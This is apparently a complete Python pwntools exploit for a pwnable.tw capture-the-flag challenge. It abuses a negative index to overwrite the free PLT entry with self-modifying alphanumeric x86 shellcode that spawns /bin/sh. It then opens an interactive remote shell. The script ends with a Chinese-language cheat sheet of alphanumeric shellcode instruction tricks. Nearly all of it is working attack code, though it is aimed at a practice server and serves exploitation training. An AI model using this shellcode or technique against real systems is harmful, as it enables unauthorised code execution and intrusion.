from pwn import *

###Utils
def create(idx,data):
    r.sendlineafter('choice :','1')
    r.sendlineafter('Index :',str(idx))
    r.sendlineafter('Name :',data)

def delete(idx):
    r.sendlineafter('choice :','3')
    r.sendlineafter('Index :',str(idx))

###Useful addr
free_plt_idx = -19


###Shell code
#/bin/sh
#2F 62 69 6E 2F 73 68 00

a = asm('''
        push 0x68
        push 0x732F2F2F
        push 0x6E69622F
        push esp
        pop ebx             #ebx -> /bin/sh
        push edx
        pop ecx             #ecx = 0
        push edx
        pop esi             #esi = 0
        push edx
        dec edx
        dec edx             #edx = 0xfe
        xor [eax+0x22],dl   #create int 0x80
        xor [eax+0x23],dl   #create int 0x80
        inc edx
        inc edx             #edx = 0
        push 0x40
        pop eax             #eax = 0x40
        xor al,0x4b         #eax = 0xb
        ''')+b'\x33\x7e'


###Exploit
#Hijack free_plt with shell code
r = remote('chall.pwnable.tw',10201)
create(-19,a)
delete(-19)
r.interactive()



###Appendix
###Alphanumerical Shellcode Ref
'''
1.数据传送:
push/pop eax...
pusha/popa

2.算术运算:
inc/dec eax...
sub al, 立即数
sub byte ptr [eax... + 立即数], al dl...
sub byte ptr [eax... + 立即数], ah dh...
sub dword ptr [eax... + 立即数], esi edi
sub word ptr [eax... + 立即数], si di
sub al dl..., byte ptr [eax... + 立即数]
sub ah dh..., byte ptr [eax... + 立即数]
sub esi edi, dword ptr [eax... + 立即数]
sub si di, word ptr [eax... + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax... + 立即数], esi edi
and word ptr [eax... + 立即数], si di
and ah dh..., byte ptr [ecx edx... + 立即数]
and esi edi, dword ptr [eax... + 立即数]
and si di, word ptr [eax... + 立即数]

xor al, 立即数
xor byte ptr [eax... + 立即数], al dl...
xor byte ptr [eax... + 立即数], ah dh...
xor dword ptr [eax... + 立即数], esi edi
xor word ptr [eax... + 立即数], si di
xor al dl..., byte ptr [eax... + 立即数]
xor ah dh..., byte ptr [eax... + 立即数]
xor esi edi, dword ptr [eax... + 立即数]
xor si di, word ptr [eax... + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax... + 立即数], al dl...
cmp byte ptr [eax... + 立即数], ah dh...
cmp dword ptr [eax... + 立即数], esi edi
cmp word ptr [eax... + 立即数], si di
cmp al dl..., byte ptr [eax... + 立即数]
cmp ah dh..., byte ptr [eax... + 立即数]
cmp esi edi, dword ptr [eax... + 立即数]
cmp si di, word ptr [eax... + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.交换al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
'''
